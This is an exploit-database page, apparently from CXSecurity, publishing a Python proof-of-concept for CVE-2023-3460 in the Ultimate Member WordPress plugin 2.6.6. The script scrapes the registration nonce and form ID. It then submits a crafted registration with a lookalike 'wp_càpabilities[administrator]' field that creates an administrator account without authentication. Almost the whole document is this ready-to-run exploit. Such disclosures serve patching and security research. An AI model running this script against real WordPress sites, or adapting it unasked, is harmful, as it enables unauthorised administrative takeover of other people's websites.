---
title: Ultimate Member WordPress Plugin 2.6.6 Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2025080025
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-08-29
fetch_date: 2025-10-07T00:13:22.550819
---

# Ultimate Member WordPress Plugin 2.6.6 Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Ultimate Member WordPress Plugin 2.6.6 Privilege Escalation** **2025.08.28**  Credit:  **[Gurjot Singh](https://cxsecurity.com/author/Gurjot%2BSingh/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2023-3460](https://cxsecurity.com/cveshow/CVE-2023-3460/ "Click to see CVE-2023-3460")**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

#!/usr/bin/env python3
# Exploit Title: Ultimate Member WordPress Plugin 2.6.6 - Privilege Escalation
# Exploit Author: Gurjot Singh
# CVE: CVE-2023-3460
# Description : The attached PoC demonstrates how an unauthenticated attacker can escalate privileges to admin by abusing unsanitized input in `wp\_capabilities` during registration.
import requests
import argparse
import re
import urllib3
from bs4 import BeautifulSoup
import sys
urllib3.disable\_warnings(urllib3.exceptions.InsecureRequestWarning)
def check\_password\_strength(password):
"""Checks if password meets complexity requirements."""
if len(password) < 8:
print("[!] Password too short! Must be at least 8 characters.")
print(" Example: Admin@123")
sys.exit(1)
# At least one uppercase, one lowercase, one digit, and one special char
if not re.search(r'[A-Z]', password):
print("[!] Password must contain at least one uppercase letter.")
print(" Example: Admin@123")
sys.exit(1)
if not re.search(r'[a-z]', password):
print("[!] Password must contain at least one lowercase letter.")
print(" Example: Admin@123")
sys.exit(1)
if not re.search(r'\d', password):
print("[!] Password must contain at least one number.")
print(" Example: Admin@123")
sys.exit(1)
if not re.search(r'[!@#$%^&\*(),.?":{}|<>]', password):
print("[!] Password must contain at least one special character (!@#$%^&\* etc.)")
print(" Example: Admin@123")
sys.exit(1)
def fetch\_form\_details(session, target\_url):
print("[\*] Fetching form details from register page...")
try:
res = session.get(target\_url, verify=False)
soup = BeautifulSoup(res.text, "html.parser")
nonce\_input = soup.find("input", {"name": "\_wpnonce"})
nonce = nonce\_input["value"] if nonce\_input else None
if nonce:
print(f"[+] Found \_wpnonce: {nonce}")
else:
print("[-] Could not find \_wpnonce")
field\_names = {}
for inp in soup.find\_all("input"):
if inp.get("name"):
field\_names[inp.get("name")] = ""
return nonce, field\_names
except Exception as e:
print(f"[!] Error fetching form details: {e}")
return None, {}
def exploit\_register(target\_url, username, password):
session = requests.Session()
target\_url = target\_url.rstrip('/')
nonce, fields = fetch\_form\_details(session, target\_url)
if not nonce:
return
form\_id = None
for name in fields:
m = re.search(r"user\_login-(\d+)", name)
if m:
form\_id = m.group(1)
break
if not form\_id:
form\_id = "7"
print(f"[+] Using form ID: {form\_id}")
data = {
f"user\_login-{form\_id}": username,
f"first\_name-{form\_id}": "Admin",
f"last\_name-{form\_id}": username,
f"user\_email-{form\_id}": f"{username}@example.com",
f"user\_password-{form\_id}": password,
f"confirm\_user\_password-{form\_id}": password,
"form\_id": form\_id,
"um\_request": "",
"\_wpnonce": nonce,
"\_wp\_http\_referer": "/register/",
"wp\_càpabilities[administrator]": "1"
}
headers = {
"Content-Type": "application/x-www-form-urlencoded",
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
"Referer": target\_url,
"Origin": target\_url.split("/register")[0],
}
cookies = {
"wordpress\_test\_cookie": "WP Cookie check",
"wp\_lang": "en\_US"
}
print(f"[\*] Sending malicious registration for {username} ...")
try:
response = session.post(target\_url, data=data, headers=headers, cookies=cookies, verify=False)
if response.status\_code == 200 and ("Thank you for registering" in response.text or "You have successfully registered" in response.text):
print(f"[+] Admin account '{username}' created successfully!")
print(f"[+] Login with: Username: {username} | Password: {password}")
else:
print(f"[-] Could not confirm success. Check target manually.")
except Exception as e:
print(f"[!] Error during exploit: {e}")
if \_\_name\_\_ == "\_\_main\_\_":
parser = argparse.ArgumentParser(description="Exploit for CVE-2023-3460 (Ultimate Member Admin Account Creation)")
parser.add\_argument("-t", "--target", required=True, help="Target /register/ URL (e.g., http://localhost/register/)")
parser.add\_argument("-u", "--user", default="rakesh", help="Username to create")
parser.add\_argument("-p", "--password", default="Admin@123", help="Password for the new user")
args = parser.parse\_args()
# Check password strength before running
check\_password\_strength(args.password)
exploit\_register(args.target, args.user, args.password)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025080025)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top